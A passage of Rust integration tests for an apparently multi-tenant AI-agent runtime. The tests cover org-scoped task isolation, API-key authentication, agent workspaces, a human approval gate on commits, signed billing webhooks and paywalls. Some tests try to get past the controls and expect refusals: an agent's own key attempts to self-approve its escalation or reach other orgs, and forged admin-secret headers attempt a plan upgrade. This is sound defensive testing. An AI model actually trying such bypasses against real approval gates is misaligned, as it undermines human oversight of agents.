        kernel.revoke_memory_for_task("task-1").await;
        tokio::time::timeout(std::time::Duration::from_secs(5), rx)
            .await
            .unwrap()
            .unwrap();
    }

    #[tokio::test]
    async fn a2a_tasks_are_org_scoped_across_http_and_status() {
        let temp = tempfile::tempdir().unwrap();
        let repo = temp.path().join("repo");
        tokio::fs::create_dir_all(&repo).await.unwrap();
        let kernel = Arc::new(AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap());
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", repo)
            .await
            .unwrap();
        let (org_a_key, _) = kernel
            .paas
            .issue_api_key("org-a", "agent-a", "Engineer", None, "test")
            .await
            .unwrap();
        let (org_b_key, _) = kernel
            .paas
            .issue_api_key("org-b", "agent-b", "Engineer", None, "test")
            .await
            .unwrap();

        let requester = AgentIdentity::new("org-b", "requester", "Planner");
        let assignee = AgentIdentity::new("org-b", "assignee", "Worker");
        kernel
            .ipc
            .register_peer(&requester, vec!["*".to_string()])
            .await
            .unwrap();
        kernel
            .ipc
            .register_peer(&assignee, vec!["*".to_string()])
            .await
            .unwrap();
        let task = kernel
            .ipc
            .send(IpcEnvelope {
                msg_id: String::new(),
                org_id: "org-b".to_string(),
                from_agent: "org-b/requester".to_string(),
                to_target: "assignee".to_string(),
                kind: IpcKind::TaskRequest {
                    timeout_secs: Some(60),
                },
                subject: "org-b secret task".to_string(),
                payload: json!({ "secret": "do-not-leak" }),
                attachments: vec![],
                status: MessageDeliveryStatus::Unread,
                created_at_ms: 0,
            })
            .await
            .unwrap();
        let task_id = task.msg_id;

        let get = |key: &str, id: String| {
            let key = key.to_string();
            async move {
                raw_http(
                    addr,
                    "POST",
                    "/v1/a2a",
                    Some(&key),
                    Some(json!({
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "tasks/get",
                        "params": { "id": id }
                    })),
                )
                .await
            }
        };

        let (owner_head, owner_body) = get(org_b_key.as_str(), task_id.clone()).await;
        assert!(owner_head.contains("200 OK"), "{owner_head}");
        assert_eq!(owner_body["result"]["id"], task_id);
        assert_eq!(owner_body["result"]["org_id"], "org-b");

        let (cross_head, cross_body) = get(org_a_key.as_str(), task_id.clone()).await;
        assert!(cross_head.contains("200 OK"), "{cross_head}");
        assert_eq!(cross_body["error"]["code"], -32004);
        assert!(!cross_body.to_string().contains("do-not-leak"));

        let (_, unknown_body) = get(org_a_key.as_str(), "task-does-not-exist".to_string()).await;
        assert_eq!(cross_body["error"]["code"], unknown_body["error"]["code"]);

        let (_, list_a) = raw_http(
            addr,
            "POST",
            "/v1/a2a",
            Some(&org_a_key),
            Some(json!({
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tasks/list",
                "params": {}
            })),
        )
        .await;
        assert!(list_a["result"]["tasks"]
            .as_array()
            .unwrap()
            .iter()
            .all(|task| task["org_id"] != "org-b"));

        let (_, list_b) = raw_http(
            addr,
            "POST",
            "/v1/a2a",
            Some(&org_b_key),
            Some(json!({
                "jsonrpc": "2.0",
                "id": 3,
                "method": "tasks/list",
                "params": {}
            })),
        )
        .await;
        assert!(list_b["result"]["tasks"]
            .as_array()
            .unwrap()
            .iter()
            .any(|task| task["id"] == task_id));

        let (_, status_a) = raw_http(addr, "GET", "/api/status", Some(&org_a_key), None).await;
        assert!(status_a["a2a_tasks"]
            .as_array()
            .unwrap()
            .iter()
            .all(|task| task["org_id"] != "org-b"));

        let (_, status_b) = raw_http(addr, "GET", "/api/status", Some(&org_b_key), None).await;
        assert!(status_b["a2a_tasks"]
            .as_array()
            .unwrap()
            .iter()
            .any(|task| task["id"] == task_id));

        // A tenant whose org id is literally `default-org` must not be widened to `*` when the
        // request omits `org_id`. This used to expose every org's peers/tasks/secrets.
        let (default_org_key, _) = kernel
            .paas
            .issue_api_key("default-org", "default-agent", "Engineer", None, "test")
            .await
            .unwrap();
        let (_, default_status) =
            raw_http(addr, "GET", "/api/status", Some(&default_org_key), None).await;
        assert_eq!(default_status["org_id"], "default-org");
        assert!(default_status["a2a_tasks"]
            .as_array()
            .unwrap()
            .iter()
            .all(|task| task["org_id"] != "org-b"));
        assert!(default_status["peers"]
            .as_array()
            .unwrap()
            .iter()
            .all(|peer| peer["org_id"] != "org-b"));
        assert!(default_status["global_peers"]
            .as_array()
            .unwrap()
            .is_empty());

        let (_, cancel_cross) = raw_http(
            addr,
            "POST",
            "/v1/a2a",
            Some(&org_a_key),
            Some(json!({
                "jsonrpc": "2.0",
                "id": 4,
                "method": "tasks/cancel",
                "params": { "id": task_id }
            })),
        )
        .await;
        assert_eq!(cancel_cross["error"]["code"], -32004);
        let (_, after_cross_cancel) = get(org_b_key.as_str(), task_id.clone()).await;
        assert_eq!(after_cross_cancel["result"]["state"], "submitted");
    }

    #[tokio::test]
    async fn test_paas_api_key_auth_cloud_workspace_pr_and_dashboard_approval() {
        let temp = tempfile::tempdir().unwrap();
        let source_repo = temp.path().join("source_repo");
        let runtime_root = temp.path().join("aegis_runtime");
        tokio::fs::create_dir_all(&source_repo).await.unwrap();
        tokio::fs::write(source_repo.join("lib.rs"), "pub fn compute() -> i32 { 10 }\n")
            .await
            .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", source_repo.clone())
            .await
            .unwrap();
        let op = kernel.operator_token();

        async fn http_call(
            addr: std::net::SocketAddr,
            method: &str,
            path: &str,
            auth: Option<&str>,
            body: Option<Value>,
        ) -> (String, Value) {
            let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
            let body_str = body.map(|b| b.to_string()).unwrap_or_default();
            let auth_hdr = auth
                .map(|a| format!("Authorization: Bearer {}\r\n", a))
                .unwrap_or_default();
            let req = format!(
                "{} {} HTTP/1.1\r\nHost: {}\r\n{}Content-Length: {}\r\n\r\n{}",
                method,
                path,
                addr,
                auth_hdr,
                body_str.len(),
                body_str
            );
            stream.write_all(req.as_bytes()).await.unwrap();
            let mut buf = Vec::new();
            tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut buf)
                .await
                .unwrap();
            let raw = String::from_utf8_lossy(&buf).to_string();
            let (head, b) = raw.split_once("\r\n\r\n").unwrap_or((&raw, "{}"));
            let parsed = serde_json::from_str::<Value>(b).unwrap_or_else(|_| json!({ "html": b }));
            (head.to_string(), parsed)
        }

        // 1. Verify Embedded Minimalist Web Console (`GET /dashboard`) and simulation endpoint (`POST /v1/approvals/simulate`)
        let (dash_head, dash_body) = http_call(addr, "GET", "/dashboard", None, None).await;
        assert!(dash_head.contains("200 OK"));
        assert!(dash_head.contains("text/html"));
        let html_str = dash_body["html"].as_str().unwrap();
        assert!(html_str.contains("Aegis Cloud — Developer Console"));
        assert!(html_str.contains("<svg"));
        assert!(!html_str.chars().any(|c| ('\u{1F300}'..='\u{1FAFF}').contains(&c)));

        // 1b. Verify Commercial Plan Tier (`POST /v1/tenants/plan`) & Concurrency Quota Enforcement
        let (plan_head, plan_resp) = http_call(
            addr,
            "POST",
            "/v1/tenants/plan",
            Some(&op),
            Some(json!({ "org_id": "acme-cloud", "plan_tier": "community" })),
        )
        .await;
        assert!(plan_head.contains("200 OK"));
        assert_eq!(plan_resp["monthly_price_usd"], 0);
        assert_eq!(plan_resp["tenant"]["max_concurrent_agents"], 1);

        // Requesting 3 agents on Community plan (max 1) must fail
        let (over_head, over_resp) = http_call(
            addr,
            "POST",
            "/v1/workspaces",
            Some(&op),
            Some(json!({
                "org_id": "acme-cloud",
                "workspace_id": "ws-over-quota",
                "source_url": source_repo.to_string_lossy(),
                "agents": ["a1", "a2", "a3"]
            })),
        )
        .await;
        assert!(over_head.contains("500 Internal Server Error"));
        assert!(over_resp["error"].as_str().unwrap().contains("at most 1 concurrent cloud agents"));

        // Upgrade tenant to Pro ($29/mo, max 8 agents)
        let (_, up_resp) = http_call(
            addr,
            "POST",
            "/v1/tenants/plan",
            Some(&op),
            Some(json!({ "org_id": "acme-cloud", "plan_tier": "pro" })),
        )
        .await;
        assert_eq!(up_resp["monthly_price_usd"], 29);
        assert_eq!(up_resp["tenant"]["max_concurrent_agents"], 8);

        let (sim_head, sim_resp) = http_call(
            addr,
            "POST",
            "/v1/approvals/simulate",
            Some(&op),
            Some(json!({ "org_id": "acme-cloud", "agent_id": "demo-agent" })),
        )
        .await;
        assert!(sim_head.contains("200 OK"));
        assert_eq!(sim_resp["status"], "simulated");
        let sim_esc_id = sim_resp["escalation_id"].as_str().unwrap();
        let (_, deny_resp) = http_call(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op),
            Some(json!({ "escalation_id": sim_esc_id, "decision": "deny" })),
        )
        .await;
        assert_eq!(deny_resp["status"], "denied");

        // 2. Provision a Cloud Workspace (`POST /v1/workspaces`) with 2 parallel CoW agent branches
        let (ws_head, ws_resp) = http_call(
            addr,
            "POST",
            "/v1/workspaces",
            Some(&op),
            Some(json!({
                "org_id": "acme-cloud",
                "workspace_id": "ws-billing",
                "source_url": source_repo.to_string_lossy(),
                "branch": "main",
                "agents": ["coder-alpha", "reviewer-beta"]
            })),
        )
        .await;
        assert!(ws_head.contains("200 OK"));
        assert_eq!(ws_resp["status"], "provisioned");

        // 3. Mint a scoped `ak_live_*` API key (`POST /v1/tenants/keys`) bound to `ws-billing`
        let (_, key_resp) = http_call(
            addr,
            "POST",
            "/v1/tenants/keys",
            Some(&op),
            Some(json!({
                "org_id": "acme-cloud",
                "agent_id": "coder-alpha",
                "workspace_id": "ws-billing",
                "label": "CI Cloud Key"
            })),
        )
        .await;
        let api_key = key_resp["api_key"].as_str().unwrap().to_string();
        assert!(api_key.starts_with("ak_live_"));

        // 4. Reject forged API key with `401 Unauthorized`
        let (bad_head, _) = http_call(
            addr,
            "POST",
            "/v1/mcp",
            Some("ak_live_forged_invalid_token"),
            Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "initialize" })),
        )
        .await;
        assert!(bad_head.contains("401 Unauthorized"));

        // 5. Modify `lib.rs` in `coder-alpha`'s CoW shadow workspace via authenticated `POST /v1/mcp`
        let (edit_head, _) = http_call(
            addr,
            "POST",
            "/v1/mcp",
            Some(&api_key),
            Some(json!({
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {
                    "name": "fs_edit",
                    "arguments": {
                        "path": "lib.rs",
                        "target": "pub fn compute() -> i32 { 10 }",
                        "replacement": "pub fn compute() -> i32 { 42 }"
                    }
                }
            })),
        )
        .await;
        assert!(edit_head.contains("200 OK"));

        // 5b. Verify Scale-to-Zero Hibernation (`POST /v1/workspaces/hibernate`) & Instant Wake (`POST /v1/workspaces/wake`)
        let (hib_head, hib_resp) = http_call(
            addr,
            "POST",
            "/v1/workspaces/hibernate",
            Some(&api_key),
            Some(json!({ "org_id": "acme-cloud", "workspace_id": "ws-billing" })),
        )
        .await;
        assert!(hib_head.contains("200 OK"));
        assert_eq!(hib_resp["status"], "hibernated");
        assert_eq!(hib_resp["scale_to_zero"], true);

        // Verify source-only diff inspection (`GET /v1/workspaces/diff`) automatically wakes the hibernated workspace
        // and returns `unified_diff` + `changed_source_files` while preserving the uncommitted CoW edit!
        let (diff_head, diff_resp) = http_call(
            addr,
            "GET",
            "/v1/workspaces/diff?org_id=acme-cloud&agent_id=coder-alpha&workspace_id=ws-billing",
            Some(&api_key),
            None,
        )
        .await;
        assert!(diff_head.contains("200 OK"));
        assert_eq!(diff_resp["changes_count"], 1);
        assert!(diff_resp["unified_diff"]
            .as_str()
            .unwrap()
            .contains("+pub fn compute() -> i32 { 42 }"));
        assert_eq!(
            diff_resp["changed_source_files"][0]["path"].as_str().unwrap(),
            "lib.rs"
        );

        // 6. Trigger `workspace_commit` -> hits HITL approval gate -> approve via `/v1/approvals/decide`
        let (_, commit_ask) = http_call(
            addr,
            "POST",
            "/v1/mcp",
            Some(&api_key),
            Some(json!({
                "jsonrpc": "2.0",
                "id": 3,
                "method": "tools/call",
                "params": {
                    "name": "workspace_commit",
                    "arguments": {}
                }
            })),
        )
        .await;
        let ask_text = commit_ask["result"]["content"][0]["text"].as_str().unwrap();
        let ask_json: Value = serde_json::from_str(ask_text).unwrap();
        assert_eq!(ask_json["status"], "approval_required");
        let esc_id = ask_json["escalation_id"].as_str().unwrap();

        // The tenant key is what agents hold: it must not approve escalations, see other orgs, or
        // act on another org's resources.
        let (self_approve_head, _) = http_call(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&api_key),
            Some(json!({ "escalation_id": esc_id, "decision": "approve" })),
        )
        .await;
        assert!(self_approve_head.contains("403 Forbidden"), "{self_approve_head}");
        let (all_orgs_head, _) =
            http_call(addr, "GET", "/api/status?org_id=*", Some(&api_key), None).await;
        assert!(all_orgs_head.contains("403 Forbidden"), "{all_orgs_head}");
        let (cross_head, _) = http_call(
            addr,
            "POST",
            "/v1/workspaces/hibernate",
            Some(&api_key),
            Some(json!({ "org_id": "victim-org", "workspace_id": "ws-x" })),
        )
        .await;
        assert!(cross_head.contains("403 Forbidden"), "{cross_head}");
        let (anon_mint_head, _) = http_call(
            addr,
            "POST",
            "/v1/tenants/keys",
            None,
            Some(json!({ "org_id": "acme-cloud", "agent_id": "intruder" })),
        )
        .await;
        assert!(anon_mint_head.contains("403 Forbidden"), "{anon_mint_head}");

        let (app_head, app_resp) = http_call(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op),
            Some(json!({
                "escalation_id": esc_id,
                "decision": "approve",
                "ttl_secs": 3600
            })),
        )
        .await;
        assert!(app_head.contains("200 OK"));
        assert_eq!(app_resp["status"], "approved");

        // 7. Export Git branch, commit SHA, unified patch, and GitHub PR payload (`POST /v1/workspaces/pr`)
        let (pr_head, pr_resp) = http_call(
            addr,
            "POST",
            "/v1/workspaces/pr",
            Some(&api_key),
            Some(json!({
                "org_id": "acme-cloud",
                "workspace_id": "ws-billing",
                "agent_id": "coder-alpha",
                "branch_name": "aegis/coder-alpha/fix-compute",
                "commit_title": "feat(billing): update compute() return value to 42"
            })),
        )
        .await;
        assert!(pr_head.contains("200 OK"));
        assert_eq!(pr_resp["status"], "pr_bundle_exported");
        assert_eq!(pr_resp["git_branch"], "aegis/coder-alpha/fix-compute");
        assert!(!pr_resp["git_commit_sha"].as_str().unwrap().is_empty());
        assert!(pr_resp["unified_patch"]
            .as_str()
            .unwrap()
            .contains("+pub fn compute() -> i32 { 42 }"));
    }

    #[tokio::test]
    async fn test_pre_commit_semantic_verification_gate() {
        if std::env::var_os("AOS_SANDBOX_ID").is_some() {
            std::env::set_var("AEGIS_ALLOW_NESTED_TEST_SANDBOX", "1");
        }
        let temp = tempfile::tempdir().unwrap();
        let host_repo = temp.path().join("host_repo");
        let rt_dir = temp.path().join("rt");
        tokio::fs::create_dir_all(&host_repo).await.unwrap();
        let baseline_code = "pub fn calc_fee(amount: u64) -> u64 { amount / 100 }\n\
                             // anchor1\n\
                             // anchor2\n\
                             pub fn calc_tax(amount: u64) -> u64 { amount / 20 }\n";
        tokio::fs::write(host_repo.join("lib.rs"), baseline_code)
            .await
            .unwrap();

        let kernel = AegisRuntimeKernel::new(&rt_dir).await.unwrap();
        let agy = AgentIdentity::new("sem-org", "agy-agent", "Lead");
        let codex = AgentIdentity::new("sem-org", "codex-cli", "Coder");
        for id in [&agy, &codex] {
            kernel
                .ensure_agent_environment(
                    id.clone(),
                    &host_repo,
                    IsolationTier::NativeOsSandbox,
                    vec!["*".to_string()],
                )
                .await
                .unwrap();
            kernel
                .call_tool(
                    id,
                    "policy_grant_lease",
                    json!({ "action_pattern": "workspace_commit", "ttl_secs": 3600 }),
                )
                .await
                .unwrap();
        }

        // Agent A (`agy`) renames `calc_fee` -> `calc_service_fee` at line 1 and commits.
        kernel
            .call_tool(
                &agy,
                "fs_edit",
                json!({
                    "path": "lib.rs",
                    "target": "pub fn calc_fee(amount: u64) -> u64 { amount / 100 }",
                    "replacement": "pub fn calc_service_fee(amount: u64) -> u64 { amount / 50 }"
                }),
            )
            .await
            .unwrap();
        kernel
            .call_tool(
                &agy,
                "workspace_commit",
                json!({ "verify_cmd": "rustc --crate-type lib --emit=metadata -o $TMPDIR/lib.rmeta lib.rs" }),
            )
            .await
            .unwrap();

        // Agent B (`codex`), starting from the old baseline, adds a call to the old `calc_fee` at the bottom.
        // Syntactically the hunks are disjoint (Line 1 vs Line 4), so Diff3 merges them cleanly,
        // but semantically `calc_fee` no longer exists!
        kernel
            .call_tool(
                &codex,
                "fs_edit",
                json!({
                    "path": "lib.rs",
                    "target": "pub fn calc_tax(amount: u64) -> u64 { amount / 20 }",
                    "replacement": "pub fn calc_tax(amount: u64) -> u64 { calc_fee(amount) + amount / 20 }"
                }),
            )
            .await
            .unwrap();

        let sem_commit = kernel
            .call_tool(
                &codex,
                "workspace_commit",
                json!({ "verify_cmd": "rustc --crate-type lib --emit=metadata -o $TMPDIR/lib.rmeta lib.rs" }),
            )
            .await;
        assert!(
            sem_commit.is_err(),
            "Expected semantic conflict to be caught by pre-commit verify_cmd gate"
        );

        // Verify the host file remains 100% untouched (still compiles and does NOT contain broken `calc_fee` call)
        let host_after = tokio::fs::read_to_string(host_repo.join("lib.rs"))
            .await
            .unwrap();
        assert!(host_after.contains("pub fn calc_service_fee"));
        assert!(!host_after.contains("calc_fee(amount)"));

        // Now Agent B fixes the call site in its rebased shadow workspace and commits with `verify_cmd` -> succeeds!
        kernel
            .call_tool(
                &codex,
                "fs_edit",
                json!({
                    "path": "lib.rs",
                    "target": "calc_fee(amount)",
                    "replacement": "calc_service_fee(amount)"
                }),
            )
            .await
            .unwrap();
        let fixed_commit = kernel
            .call_tool(
                &codex,
                "workspace_commit",
                json!({ "verify_cmd": "rustc --crate-type lib --emit=metadata -o $TMPDIR/lib.rmeta lib.rs" }),
            )
            .await
            .unwrap();
        assert_eq!(fixed_commit["status"], "committed_to_host");
        assert_eq!(fixed_commit["verification_passed"], true);
    }

    #[tokio::test]
    async fn test_billing_webhook_polar_lemonsqueezy_and_plan_timeout_guardrails() {
        let temp = tempfile::tempdir().unwrap();
        let source_repo = temp.path().join("source_repo");
        let runtime_root = temp.path().join("aegis_runtime");
        tokio::fs::create_dir_all(&source_repo).await.unwrap();
        tokio::fs::write(source_repo.join("lib.rs"), "pub fn ready() -> bool { true }\n")
            .await
            .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_root).await.unwrap());
        let outbox = runtime_root.join("outbox");
        kernel.paas.set_mailer(approver::Mailer::Directory(outbox.clone()), "https://cloud.example");
        let addr = kernel
            .clone()
            .start_http_daemon("127.0.0.1:0", source_repo.clone())
            .await
            .unwrap();

        async fn http_req_with_headers(
            addr: std::net::SocketAddr,
            method: &str,
            path: &str,
            extra_headers: &[(&str, &str)],
            body: Option<Value>,
        ) -> (String, Value) {
            let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
            let body_str = body.map(|b| b.to_string()).unwrap_or_default();
            let mut hdrs = String::new();
            for (k, v) in extra_headers {
                hdrs.push_str(&format!("{}: {}\r\n", k, v));
            }
            let req = format!(
                "{} {} HTTP/1.1\r\nHost: {}\r\n{}Content-Length: {}\r\n\r\n{}",
                method,
                path,
                addr,
                hdrs,
                body_str.len(),
                body_str
            );
            stream.write_all(req.as_bytes()).await.unwrap();
            let mut buf = Vec::new();
            tokio::io::AsyncReadExt::read_to_end(&mut stream, &mut buf)
                .await
                .unwrap();
            let raw = String::from_utf8_lossy(&buf).to_string();
            let (head, b) = raw.split_once("\r\n\r\n").unwrap_or((&raw, "{}"));
            let parsed = serde_json::from_str::<Value>(b).unwrap_or_else(|_| json!({ "raw": b }));
            (head.to_string(), parsed)
        }

        // 1. Verify `/v1/billing/checkout` returns Polar.sh & Lemon Squeezy URLs pre-populated with `org_id` and `email`
        let (chk_head, chk_resp) = http_req_with_headers(
            addr,
            "GET",
            "/v1/billing/checkout?org_id=polar-org&plan=team&email=founder@polar-org.dev",
            &[],
            None,
        )
        .await;
        assert!(chk_head.contains("200 OK"));
        assert_eq!(chk_resp["monthly_price_usd"], 79);
        assert_eq!(chk_resp["max_concurrent_agents"], 32);
        assert_eq!(chk_resp["max_exec_timeout_ms"], 600_000);
        assert!(chk_resp["providers"]["polar_sh"]
            .as_str()
            .unwrap()
            .contains("metadata[org_id]=polar-org"));
        assert!(chk_resp["providers"]["lemonsqueezy"]
            .as_str()
            .unwrap()
            .contains("checkout[custom][org_id]=polar-org"));
        let claim_id = chk_resp["claim_id"].as_str().unwrap().to_string();
        let claim_token = chk_resp["claim_token"].as_str().unwrap().to_string();
        assert!(chk_resp["checkout_url"]
            .as_str()
            .unwrap()
            .contains(&format!("metadata[claim_id]={claim_id}")));
        assert!(!chk_resp["checkout_url"].as_str().unwrap().contains(&claim_token));

        // Someone else starting a checkout for the same org gets a token that can't collect our key.
        let (_, other_chk) = http_req_with_headers(
            addr,
            "GET",
            "/v1/billing/checkout?org_id=polar-org&plan=team",
            &[],
            None,
        )
        .await;
        let other_token = other_chk["claim_token"].as_str().unwrap().to_string();

        // 2. Verify HMAC-SHA256 webhook signature rejection on forged signature
        let webhook_secret = "whsec_polar_test_secret_123";
        kernel.paas.set_secrets("adm_secret_999", webhook_secret);
        let polar_activate = json!({
            "type": "subscription.created",
            "data": {
                "id": "sub_polar_99",
                "customer_email": "founder@polar-org.dev",
                "metadata": {
                    "org_id": "polar-org",
                    "plan_tier": "team",
                    "claim_id": claim_id
                }
            }
        });
        let (forged_head, _) = http_req_with_headers(
            addr,
            "POST",
            "/v1/billing/webhook",
            &[
                ("X-Polar-Signature", "sha256=deadbeef0000"),
            ],
            Some(polar_activate.clone()),
        )
        .await;
        assert!(forged_head.contains("401 Unauthorized"));

        // 3. Send valid HMAC-SHA256 signed Polar.sh `subscription.created` webhook -> auto-upgrades tenant & mints `ak_live_*` key
        let body_str = polar_activate.to_string();
        let valid_sig = paas::PaasControlPlane::hmac_sha256_hex(
            webhook_secret.as_bytes(),
            body_str.as_bytes(),
        );
        let (wh_head, wh_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/billing/webhook",
            &[
                ("X-Polar-Signature", &format!("sha256={}", valid_sig)),
            ],
            Some(polar_activate),
        )
        .await;
        assert!(wh_head.contains("200 OK"));
        assert_eq!(wh_resp["status"], "subscription_activated");
        assert_eq!(wh_resp["provider"], "polar");
        assert_eq!(wh_resp["plan_tier"], "team");
        assert_eq!(wh_resp["max_concurrent_agents"], 32);
        assert!(wh_resp.get("api_key").is_none(), "raw key must not be echoed to the provider");

        // 4. An email or org id alone, or another checkout's token, can't collect the key.
        for body in [
            json!({ "email": "founder@polar-org.dev" }),
            json!({ "org_id": "polar-org" }),
            json!({ "claim_token": other_token }),
        ] {
            let (head, _) =
                http_req_with_headers(addr, "POST", "/v1/billing/claim", &[], Some(body)).await;
            assert!(head.contains("404 Not Found"), "{head}");
        }

        // The buyer claims their newly minted `ak_live_*` key with the checkout's claim token.
        let (claim_head, claim_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/billing/claim",
            &[],
            Some(json!({ "claim_token": claim_token })),
        )
        .await;
        assert!(claim_head.contains("200 OK"));
        assert_eq!(claim_resp["status"], "subscription_claimed");
        let claimed_key = claim_resp["api_key"].as_str().unwrap().to_string();
        assert!(claimed_key.starts_with("ak_live_"));
        // The claim never carries the approver secret (the claim token may sit on disk where an
        // agent can read it); it mails an enrollment link to the billing address instead.
        assert!(claim_resp.get("approver").is_none());
        assert!(!claim_resp.to_string().contains("otpauth"));
        assert_eq!(claim_resp["approver_enrollment"]["status"], "email_sent", "{claim_resp}");
        let mail = std::fs::read_dir(&outbox).unwrap().next().unwrap().unwrap().path();
        let mail = std::fs::read_to_string(mail).unwrap();
        assert!(mail.starts_with(&format!("To: {}", claim_resp["customer_email"].as_str().unwrap().to_lowercase())), "{mail}");
        assert_eq!(kernel.paas.approver_status("polar-org").await["enrolled"], false);

        // Second claim attempt for the same key is rejected (one-time claim security)
        let (reclaim_head, _) = http_req_with_headers(
            addr,
            "POST",
            "/v1/billing/claim",
            &[],
            Some(json!({ "claim_token": claim_token })),
        )
        .await;
        assert!(reclaim_head.contains("404 Not Found"));

        // 5. Provision an active Cloud Workspace for `polar-org` using the claimed key
        let (ws_head, ws_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/workspaces",
            &[("Authorization", &format!("Bearer {}", claimed_key))],
            Some(json!({
                "org_id": "polar-org",
                "workspace_id": "ws-polar-1",
                "source_url": source_repo.to_string_lossy(),
                "agents": ["agy-agent", "claude-code", "codex-cli"]
            })),
        )
        .await;
        assert!(
            ws_head.contains("200 OK"),
            "ws_head={}, ws_resp={}",
            ws_head,
            ws_resp
        );

        // 6. Send Lemon Squeezy `subscription_cancelled` webhook -> revokes subscription key, downgrades to Community, and hibernates workspace!
        let ls_cancel = json!({
            "meta": {
                "event_name": "subscription_cancelled",
                "custom_data": {
                    "org_id": "polar-org"
                }
            },
            "data": {
                "id": "sub_polar_99"
            }
        });
        let cancel_sig = paas::PaasControlPlane::hmac_sha256_hex(
            webhook_secret.as_bytes(),
            ls_cancel.to_string().as_bytes(),
        );
        let (can_head, can_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/billing/webhook",
            &[
                ("X-Signature", &cancel_sig),
            ],
            Some(ls_cancel),
        )
        .await;
        assert!(can_head.contains("200 OK"));
        assert_eq!(can_resp["status"], "subscription_canceled");
        assert_eq!(can_resp["downgraded_plan"], "community");
        assert_eq!(can_resp["hibernated_workspaces"], json!(["ws-polar-1"]));

        // Revoked subscription key is now rejected with `401 Unauthorized`
        let (revoked_head, _) = http_req_with_headers(
            addr,
            "POST",
            "/v1/mcp",
            &[("Authorization", &format!("Bearer {}", claimed_key))],
            Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "initialize" })),
        )
        .await;
        assert!(revoked_head.contains("401 Unauthorized"));

        // 7. Verify Admin Secret Guard on `POST /v1/tenants/plan` blocks unauthorized self-upgrades
        let (unauth_plan_head, unauth_plan_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/tenants/plan",
            // A client-chosen "override" must not let it pick the secret it then presents.
            &[
                ("X-Aegis-Admin-Secret-Override", "attacker"),
                ("X-Aegis-Admin-Secret", "attacker"),
            ],
            Some(json!({ "org_id": "free-org", "plan_tier": "pro" })),
        )
        .await;
        assert!(unauth_plan_head.contains("401 Unauthorized"), "{unauth_plan_head}");
        assert!(unauth_plan_resp["error"].is_string());
        let op_bearer = format!("Bearer {}", kernel.operator_token());

        // 8. Verify `/v1/mcp` Dynamic Concurrent Agent Paywall on Free (`community`) plan (max 1 active Agent)
        let (agent1_head, agent1_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/mcp",
            &[
                ("Authorization", op_bearer.as_str()),
                ("X-Aegis-Org", "free-org"),
                ("X-Aegis-Agent", "claude-agent-1"),
            ],
            Some(json!({
                "jsonrpc": "2.0",
                "id": 10,
                "method": "tools/call",
                "params": {
                    "name": "workspace_status",
                    "arguments": {}
                }
            })),
        )
        .await;
        assert!(agent1_head.contains("200 OK"));
        assert!(agent1_resp["result"]["isError"].is_null());

        // Second concurrent Agent (`cursor-agent-2`) on Free (`community`) plan is blocked by the Paywall!
        let (agent2_head, agent2_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/mcp",
            &[
                ("Authorization", op_bearer.as_str()),
                ("X-Aegis-Org", "free-org"),
                ("X-Aegis-Agent", "cursor-agent-2"),
            ],
            Some(json!({
                "jsonrpc": "2.0",
                "id": 11,
                "method": "tools/call",
                "params": {
                    "name": "workspace_status",
                    "arguments": {}
                }
            })),
        )
        .await;
        assert!(agent2_head.contains("200 OK"));
        assert_eq!(agent2_resp["result"]["isError"], true);
        assert_eq!(
            agent2_resp["result"]["paywall"]["code"],
            "PAYWALL_CONCURRENT_AGENTS_LIMIT"
        );
        assert!(agent2_resp["result"]["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("[AEGIS CLOUD PAYWALL"));

        // 9. Verify `X-Aegis-Paywall-Mode: http-402` returns HTTP 402 Payment Required
        let (p402_head, p402_resp) = http_req_with_headers(
            addr,
            "POST",
            "/v1/mcp",
            &[
                ("Authorization", op_bearer.as_str()),
                ("X-Aegis-Org", "free-org"),
                ("X-Aegis-Agent", "cursor-agent-2"),
                ("X-Aegis-Paywall-Mode", "http-402"),
            ],
            Some(json!({
                "jsonrpc": "2.0",
                "id": 12,
                "method": "tools/call",
                "params": {
                    "name": "workspace_status",
                    "arguments": {}
                }
            })),
        )
        .await;
        assert!(p402_head.contains("402 Payment Required"));
        assert_eq!(p402_resp["code"], "PAYWALL_CONCURRENT_AGENTS_LIMIT");

        // 10. Verify `/v1/billing/status` returns live quota & subscription status without leaking `ak_live_*`
        let (stat_head, stat_resp) = http_req_with_headers(
            addr,
            "GET",
            "/v1/billing/status?org_id=free-org",
            &[],
            None,
        )
        .await;
        assert!(stat_head.contains("200 OK"));
        assert_eq!(stat_resp["plan_tier"], "community");
        assert_eq!(stat_resp["quotas"]["daily_syscalls_used"], 1);
        assert_eq!(stat_resp["quotas"]["daily_syscalls_limit"], 200);
        assert_eq!(stat_resp["quotas"]["active_agents_count"], 1);
    }

    #[tokio::test]
    async fn test_proc_exec_background_job_and_poll_pid() {
        let temp = tempfile::tempdir().unwrap();
        let runtime_dir = temp.path().join("runtime");
        let host_project = temp.path().join("host_project");
        tokio::fs::create_dir_all(&host_project).await.unwrap();
        tokio::fs::write(host_project.join("README.md"), "# Test\n")
            .await
            .unwrap();

        let kernel = AegisRuntimeKernel::new(&runtime_dir).await.unwrap();
        let agent = AgentIdentity::new("org-bg", "agent-bg", "Benchmark Runner");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_project,
                IsolationTier::NativeOsSandbox,
